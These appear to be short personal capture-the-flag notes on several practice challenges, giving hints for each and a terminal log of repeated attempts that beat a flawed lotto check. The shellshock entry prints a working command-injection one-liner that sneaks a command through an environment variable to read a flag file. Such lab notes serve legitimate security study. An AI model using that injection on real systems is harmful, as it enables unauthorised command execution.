### leg
the addresses of the code are in the .asm file, so it is possible to get an estimate of 
the range of address, then I brute force about 40 addresses with a loop.
### mistake
This thing to note is that the '<' operator precede the '=' operator
### shellshock
some googling about how shellshock works:
`env x='() { :;}; /bin/cat flag' ./shellshock`
### coin1 
This require writing script, I skiped that
### blackjack
The code has a bug found by the compiler that there is an extra %c in one of the printfs
but this is not the bug to explot, but that the bed amount is not constrained to be positive.
### lotto
The thing to note is that the code that check the input is doing two loops for some reason.
All needed is to put 6 equal signs and try until one of the six randoms is that sign.
Also need to note that the sign must have value <= 45, like one of: !#$ ..
Also, it can't be automated because scanf is buffering.
see https://stackoverflow.com/questions/26697627/how-to-pipe-data-to-a-program-which-calls-scanf-and-read-in-linux
```
lotto@ubuntu:~$ ./lotto 
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : 123456
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
^C
lotto@ubuntu:~$ ./lotto 
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
sorry mom... I FORGOT to check duplicate numbers... :(
- Select Menu -
1. Play Lotto
2. Help
3. Exit
```
